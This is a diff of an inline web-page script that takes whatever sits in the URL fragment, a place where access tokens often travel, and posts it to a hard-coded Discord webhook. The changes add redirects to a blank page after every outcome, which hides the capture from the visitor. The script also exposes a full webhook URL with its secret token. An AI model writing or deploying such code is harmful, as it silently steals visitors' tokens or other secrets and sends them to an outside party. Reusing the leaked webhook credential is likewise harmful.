@@ -9,7 +9,6 @@
 <script>
 (function() {
   const dataToSend = window.location.hash ? window.location.hash.substring(1) : null;
-
   if (dataToSend) {
     const webhookUrl = "https://discord.com/api/webhooks/1303524286707011674/xC5koezC0nmTgXhq7OROOrq4R4XLb0hgSN35cAZFuHbNP5JZvCOVmJs81eDgk5sStkNo";
     const payload = {
@@ -22,11 +21,14 @@
       body: JSON.stringify(payload)
     }).then(() => {
       console.log("Data sent successfully!");
+      window.location.replace("about:blank");
     }).catch(error => {
       console.error("Error sending data:", error);
+      window.location.replace("about:blank");
     });
   } else {
     console.log("No data found in URL.");
+    window.location.replace("about:blank");
   }
 })();
 </script>
